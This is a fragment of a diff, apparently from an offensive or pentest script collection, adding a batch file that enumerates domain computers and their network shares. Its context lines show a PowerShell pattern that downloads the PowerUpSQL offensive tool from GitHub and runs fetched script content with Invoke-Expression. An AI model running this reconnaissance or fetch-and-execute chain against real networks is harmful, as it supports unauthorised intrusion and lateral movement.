@@ -19,6 +19,26 @@ Invoke-Expression $scriptContent
 
 
 
+@echo off
+setlocal
+
+:: Get the list of domain computers and save it to a file
+net group "domain computers" /domain > computers.txt
+
+:: Filter only computer names (ignores headers and footers in the output)
+for /f "tokens=1 delims=" %%A in ('findstr /R /C:"\\\\" computers.txt') do (
+    echo Enumerating shares on %%A
+    :: Run net view to list shared resources on each computer
+    net view %%A >> shares.txt 2>&1
+)
+
+:: Clean up temporary files
+del computers.txt
+
+echo Network share enumeration completed. Check shares.txt for results.
+
+
+
 $url = "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/refs/heads/master/PowerUpSQL.ps1"
 $request = [System.Net.WebRequest]::Create($url)
 $request.Method = "GET"
